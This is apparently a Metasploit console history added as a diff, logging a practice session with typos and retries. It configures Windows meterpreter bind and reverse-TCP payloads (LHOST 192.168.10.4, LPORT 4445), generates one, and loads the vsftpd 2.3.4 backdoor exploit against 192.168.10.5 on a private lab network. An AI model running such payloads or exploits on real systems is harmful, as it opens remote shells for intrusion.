@@ -1,0 +1,38 @@
+use payload/windows/meterpreter/bind_tcp
+show optins
+show options
+clear
+back
+exit
+use payload/windows/meterpreter/bind_tcp
+show options
+back
+use payload/windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.10.4
+set LPORT 4445
+show opyions
+generate
+cd /usr/share/metasploit-framework/modules/exploits
+ls
+cd unix
+ls
+cd ftp
+ls
+clear
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS 192.168.10.5
+show options
+cd /usr/share/metasploite-framework/modules/enciders
+cd /usr/share/metasploite-framework/modules/encodedrs
+cd /usr/share/metasploite-framework/modules/encoders
+clear
+back
+exit
+cd /usr/share/metasploite-framework/modules/exploits
+cd usr/share/metasploite-framework/modules/exploits
+cd cd /usr/share/Metasploit-framework/modules/exploits
+cd /usr/share/Metasploit-framework/modules/exploits
+back
+exit
